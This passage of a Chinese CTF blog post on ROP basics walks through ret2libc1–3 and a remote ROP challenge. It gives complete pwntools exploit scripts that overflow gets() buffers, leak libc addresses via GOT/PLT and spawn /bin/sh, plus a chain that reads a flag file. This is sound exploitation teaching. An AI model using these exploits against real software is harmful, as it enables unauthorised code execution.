&gt;_&lt;&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>由于gets函数的存在，存在缓冲区溢出漏洞</p>
+<p>找一下sh字符串</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> ROPgadget --binary ret2libc1 --string <span class="hljs-string">&quot;/bin/sh&quot;</span></span><br>Strings information<br>============================================================<br>0x08048720 : /bin/sh<br></code></pre></td></tr></table></figure>
+
+<p>可以找到system函数</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">.plt:08048460 ; int system(const char *command)<br>.plt:08048460 _system         proc near<br></code></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/env python<br>from pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>由于ret（也即是pop eip）的存在，system函数上面+8地址处才是真正的system函数的参数，因此+4地址处需要4字节的填充</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303222128090.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">~&gt;</span><span class="bash"> checksec  --file=ret2libc2</span><br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE<br>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   84 Symbols     No       0               2       ret2libc2<br><span class="hljs-meta"></span><br><span class="hljs-meta">~&gt;</span><span class="bash"> file ret2libc2</span><br>ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What do you think ?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到有system函数</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_system</span>	.plt	<span class="hljs-number">08048490</span>	<span class="hljs-number">00000006</span>	<span class="hljs-number">00000000</span>	<span class="hljs-number">00000004</span>	R	.	.	.	.	.	T	.<br></code></pre></td></tr></table></figure>
+
+<p>但是这道题没有现成的/bin/sh字符串，因此我们需要把/bin/sh写到.bss段里面。看一下.bss段</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.bss:0804A080 ; char buf2[100]</span><br><span class="hljs-title">.bss:0804A080 buf2            db 64h dup(?)</span><br><span class="hljs-title">.bss:0804A080 _bss            ends</span><br><span class="hljs-title">.bss:0804A080</span><br></code></pre></td></tr></table></figure>
+
+<p>我们可以把返回地址写成gets函数，手动输入/bin/sh字符串，达到将/bin/sh写入到.bss段的目的，之后触发system(/bin/sh)即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br><br><span class="hljs-comment">#ida得到地址</span><br>gets_plt=<span class="hljs-number">0x08048460</span><br>binsh_addr = <span class="hljs-number">0x0804A080</span><br>system_plt = <span class="hljs-number">0x08048490</span><br><br><span class="hljs-comment">#gdb调一下得到112偏移</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, gets_plt,system_plt,binsh_addr,binsh_addr])<br>sh.sendline(payload)<br>sh.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303222348210.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">~&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./ret2libc3</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/ret2libc3&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="got、plt、链接"><a href="#got、plt、链接" class="headerlink" title="got、plt、链接"></a>got、plt、链接</h2><p>这里需要补充关于链接的知识</p>
+<p>动态链接的程序，不会再在编译时得到printf的地址。原因很简单，libc有可能升级或者改变版本版本（比如换了别的主机运行不同的libc版本），因此不能硬编码库函数地址；此外，由于 ASLR 的现代系统在每次程序调用的不同位置加载库，硬编码也是不可以的，我们可以使用ldd命令查看动态链接的程序的libc的地址，ldd 命令模拟加载可执行程序需要的动态链接库，但并不执行程序，后面的地址部分表示模拟装载过程中动态链接库的地址。如果尝试多次运行 ldd 命令，我们会发现每次动态链接库的地址都是不一样的，因为这个地址是动态定位的</p>
+<p>Linux的策略是，允许在程序运行时查找所有这些地址，并提供一种从库调用这些函数的机制，这就是所谓的重定位，这个过程由链接器完成</p>
+<p>下面是链接期间有关的段，在ida中可以使用shift+f7查找段的地址</p>
+<table>
+<thead>
+<tr>
+<th>段</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>.plt</strong>（<code>Procedure Linkage Table</code>)</td>
+<td>过程链接表</td>
+</tr>
+<tr>
+<td><strong>.got</strong>（<code>Global Offset Table</code>）</td>
+<td>全局偏移表，链接器为外部符号填充的实际偏移表</td>
+</tr>
+<tr>
+<td><strong>.got.plt</strong></td>
+<td>属于got表</td>
+</tr>
+<tr>
+<td><strong>.plt.got</strong></td>
+<td>只是为了对称，无意义</td>
+</tr>
+</tbody></table>
+<p>routine：</p>
+<ul>
+<li>1.调用libc函数，比如gets函数，<code>call _puts</code></li>
+<li>2.进入plt表，jmp到got表，由于懒加载机制，第一次不会得到真实地址，而是进入到got表之后重新回到plt表，如果不是第一次那么会直接跳转到已经解析的地址处</li>
+<li>3.push func_id、jmp common进入公共plt，再次进入got表</li>
+<li>4.跳转到_dl_runtime_resolve函数，进行地址解析、重定位</li>
+<li>5.将真实地址写入got表</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">08048672</span>                 call    _puts<br><br><span class="hljs-meta"># puts@plt </span><br>    <br>.plt:<span class="hljs-number">08048460</span>                 jmp     ds:off_804A018 # 这个地址第一次不会被解析<br>.plt:<span class="hljs-number">08048460</span> _puts           endp<br>.plt:<span class="hljs-number">08048460</span><br>.plt:<span class="hljs-number">08048466</span> ; ---------------------------------------------------------------------------<br>.plt:<span class="hljs-number">08048466</span>                 push    <span class="hljs-number">18</span>h<br>.plt:<span class="hljs-number">0804846B</span>                 jmp     sub_8048420<br>    <br># sub_8048420    <br><br>.plt:<span class="hljs-number">08048420</span>                 push    ds:dword_804A004<br>.plt:<span class="hljs-number">08048426</span>                 jmp     ds:dword_804A008<br>    <br>.got.plt:<span class="hljs-number">0804</span>A004 dword_804A004   dd <span class="hljs-number">0</span>                    ; DATA XREF: sub_8048420↑r<br>.got.plt:<span class="hljs-number">0804</span>A008 dword_804A008   dd <span class="hljs-number">0</span>                    ; DATA XREF: sub_8048420+<span class="hljs-number">6</span>↑r<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303251612518.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>与上道题不同的是，这道题没有system函数，也没有/bin/sh字符串，因此我们需要得到libc的地址，并在libc中找到system和sh字符串</p>
+<p>分析：</p>
+<ul>
+<li>利用got表泄露，得到puts函数的地址</li>
+<li>由于libc内的函数最低12位不随着libc库版本的改变而改变，因此只要得到puts函数的地址，就可以得到libc的版本</li>
+<li>由于libc内的函数的相对偏移不随着libc库版本的改变而改变，因此只要得到puts函数的地址，就可以得到其余函数的地址（比如system函数、sh字符串）</li>
+</ul>
+<p>利用<a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a>，可以很方便的达到目的</p>
+<p>程序开始执行，在遇到gets函数的时候，我们需要修改返回地址使得可以返回到main函数，同时调用puts函数，且将puts_got的值输出，从而得到libc版本</p>
+<p>在得到puts_got之后，返回到main执行，这时候会再次回到gets函数的所在位置，我们需要观察栈帧，得到造成缓冲区溢出的偏移</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303252330297.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一次的偏移好算，直接gdb到gets的调用即可，为112，但是第二次比较麻烦，我们需要在使用pwntools的同时进行gdb调试。注意调试的时候在py文件中gdb.attach(sh)的位置要放对</p>
+<p>可以看到下面第二次调用gets函数时的堆栈值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303252330868.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里遇到了报错：LibcSearcher找不到合适libc，需要更新一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd LibcSearcher<br>rm -rf libc-database/ # 删掉旧的<br>git clone https://github.com/niklasb/libc-database<br>cd libc-database<br>./get # 获取新的<br></code></pre></td></tr></table></figure>
+
+<p>注意到如果想在pwntools中使用tmux的话，需要先在命令行输入tmux，等进入tmux中再输入payload.py</p>
+<p>代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-comment"># 0xffffd308-0xffffd280-0x1c+4=112</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">112</span>) + p32(puts_plt) + p32(main) + p32(puts_got)<br><br>gdb.attach(sh) <br><br>sh.sendlineafter(<span class="hljs-string">&quot;Can you find it !?&quot;</span>, payload)<br><br>puts_addr = u32(sh.recv(<span class="hljs-number">4</span>)) <span class="hljs-comment">#  get puts addr</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr) <span class="hljs-comment">#  search libc</span><br><br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment">#  get libc base</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment">#  get system addr</span><br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment">#  get /bin/sh addr</span><br><br><span class="hljs-comment">#gdb.attach(sh)</span><br><span class="hljs-comment">#104 is offset and is hard to get </span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">104</span>) + p32(system_addr) + p32(<span class="hljs-number">0xaaaa</span>) + p32(binsh_addr)<br>sh.sendlineafter(<span class="hljs-string">&quot;Can you find it !?&quot;</span>, payload)<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#p = process(&#x27;./rop&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;124.16.75.116&#x27;</span>,<span class="hljs-number">52017</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br>bss=<span class="hljs-number">0x404130</span><br>puts_plt=<span class="hljs-number">0x4010d0</span><br>read_plt=<span class="hljs-number">0x401100</span> <span class="hljs-comment">#elf.plt[&#x27;read&#x27;]</span><br>sys_open=<span class="hljs-number">0x4012c9</span><br><span class="hljs-comment">#ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;rdi&#x27;</span><br><span class="hljs-comment">#0x0000000000401503 : pop rdi ; ret</span><br><span class="hljs-comment">#0x0000000000401501 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-comment">#0x000000000040101a : ret</span><br><span class="hljs-comment">#flag</span><br><br><span class="hljs-comment">#flag&#123;8ac4f835-a613-46ff-8c86-4c2428c24982&#125;</span><br>pop_rdi=<span class="hljs-number">0x0000000000401503</span><br>pop_rsi=<span class="hljs-number">0x0000000000401501</span><br>vul=<span class="hljs-number">0x401384</span><br>ret=<span class="hljs-number">0x000000000040101a</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;your choice:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;4919&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br><span class="hljs-comment">#read(0,bss,0x100) 把./flag字符串读到bss：0x404130；使用open打开bss中的字符串，即打开./flag文件；read读取flag文件内容到bss+0x20处，使用write输出bss+0x20处的内容，即输出flag文件内容；</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(pop_rsi)+p64(bss)+p64(<span class="hljs-number">0</span>)+p64(read_plt) <span class="hljs-comment"># rdi = 0 , rsi = bss_addr , read(0,addr,?)</span><br><br>payload+=p64(vul)<br><br>p.send(payload)<br><br>p.send(<span class="hljs-string">&#x27;./flag&#x27;</span>) <span class="hljs-comment"># read: &#x27;./flag&#x27; to bss_addr</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(sys_open)+p64(vul) <span class="hljs-comment"># open flag file </span><br><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>p.send(payload)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(bss+<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt) <span class="hljs-comment"># read flag content to bss+0x20</span><br>payload+=p64(vul)<br><br><br>p.send(payload)<br>time.sleep(<span class="hljs-number">1</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(bss+<span class="hljs-number">0x20</span>)+p64(puts_plt)<br>p.send(payload)<br><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack">https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack</a>    </p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://hitcxy.com/2020/plt-got/">https://hitcxy.com/2020/plt-got/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://hitcxy.com/2020/ret2libc3/">https://hitcxy.com/2020/ret2libc3/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44681716/article/details/89877497">https://blog.csdn.net/weixin_44681716/article/details/89877497</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/papers/scz/unix/201606171028.txt">https://paper.seebug.org/papers/scz/unix/201606171028.txt</a> IDA分析GOT/PLT时的坑</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zheng__Huang/article/details/119484353">https://blog.csdn.net/Zheng__Huang/article/details/119484353</a></p>
+</li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ROP入门</div>
+      <div>http://gls.show/p/6cc1c464/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>郭佳明</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月25日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/p/6eb2f886/" title="pwn入门">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">pwn入门</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/p/842b507e/" title="使用traojan-go和proxychans实现服务器代理">
+                        <span class="hidden-mobile">使用traojan-go和proxychans实现服务器代理</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'LaPhilosophie/gls.show');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> <script src="/js/cursor.js"></script>
+</div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP备2021035969号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
